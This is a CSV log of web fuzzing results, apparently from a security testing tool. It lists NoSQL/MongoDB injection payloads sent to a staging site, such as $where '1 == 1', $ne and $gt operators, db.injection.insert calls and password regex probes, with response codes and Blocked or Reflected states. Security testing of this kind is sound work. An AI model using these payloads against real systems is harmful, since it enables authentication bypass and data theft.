Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
569,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,340,578,106,410,5339,,,[zmore]
573,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,130,578,117,410,5490,,Blocked,[$where: '1 == 1']
574,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,128,578,120,410,5498,,Blocked,"[', $where: '1 == 1']"
575,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,130,578,120,410,5493,,Blocked,"[1, $where: '1 == 1']"
576,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,130,578,111,410,5474,,Reflected,[{ $ne: 1 }]
577,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,134,578,123,410,5506,,Blocked,"[', $or: [ {}, { 'a':'a]"
578,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,131,578,147,410,5525,,Blocked,"[' } ], $comment:'successful MongoDB injection']"
579,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,136,578,134,410,5496,,Blocked,[db.injection.insert({success:1});]
580,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,131,578,186,410,5496,,Blocked,"[db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1]"
581,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,130,578,108,410,5471,,Reflected,[|| 1==1]
582,Fuzzed,Sat Jun 06 16:29:08 CEST 2020,POST,http://staging.itapp.eus/,200,OK,129,578,137,410,5471,,Blocked,[' && this.password.match(/.*/)//+%00]
583,Fuzzed,Sat Jun 06 16:29:09 CEST 2020,POST,http://staging.itapp.eus/,200,OK,129,578,139,410,5471,,Blocked,[' && this.passwordzz.match(/.*/)//+%00]
584,Fuzzed,Sat Jun 06 16:29:09 CEST 2020,POST,http://staging.itapp.eus/,200,OK,144,578,145,410,5511,,Blocked,['%20%26%26%20this.password.match(/.*/)//+%00]
585,Fuzzed,Sat Jun 06 16:29:09 CEST 2020,POST,http://staging.itapp.eus/,200,OK,141,578,147,410,5513,,Blocked,['%20%26%26%20this.passwordzz.match(/.*/)//+%00]
586,Fuzzed,Sat Jun 06 16:29:09 CEST 2020,POST,http://staging.itapp.eus/,200,OK,133,578,110,410,5483,,Blocked,[{$gt: ''}]
587,Fuzzed,Sat Jun 06 16:29:09 CEST 2020,POST,http://staging.itapp.eus/,200,OK,129,578,108,410,5471,,Reflected,[[$ne]=1]
